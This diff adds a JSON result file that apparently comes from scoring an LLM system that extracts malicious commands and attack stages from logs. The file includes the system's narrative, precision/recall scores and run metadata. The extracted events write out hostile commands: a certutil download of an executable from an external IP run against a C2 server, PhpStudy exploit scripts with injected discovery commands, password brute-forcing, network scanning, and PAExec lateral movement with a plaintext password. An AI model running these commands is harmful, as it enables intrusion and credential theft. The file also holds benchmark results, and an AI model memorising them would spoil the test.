@@ -1,0 +1,116 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Execution"
+      },
+      {
+        "command": "echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "Collection"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "Discovery"
+      },
+      {
+        "command": "WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q WinBrute.exe && del /f /q administrator_pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attack starts with an initial access using certutil to download an executable named agent.exe from a remote server. The defense evasion technique involves killing existing instances of the same malware and cleaning up traces of its activities. Once executed, the malware performs various actions such as credential harvesting using Python scripts like `PhpStudyPoc.py` and `PhpStudyExp2.py`. It also conducts discovery operations via commands like `whoami`, `arp`, `ipconfig`, and `ping`. Additionally, there is lateral movement activity through tools like `nbtscan` and `PAExec.exe`, where new hosts are scanned and accessed over the network.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 43234,
+      "completion_tokens": 2209,
+      "total_tokens": 45443,
+      "wall_clock_s": 22.354,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.375,
+      "recall": 0.75,
+      "f1": 0.5,
+      "tp": 6,
+      "fp": 10,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.125,
+      "recall": 0.3333333333333333,
+      "f1": 0.18181818181818182,
+      "tp": 2,
+      "fp": 14,
+      "fn": 4,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 43234,
+      "completion_tokens": 2209,
+      "total_tokens": 45443,
+      "wall_clock_s": 22.354,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
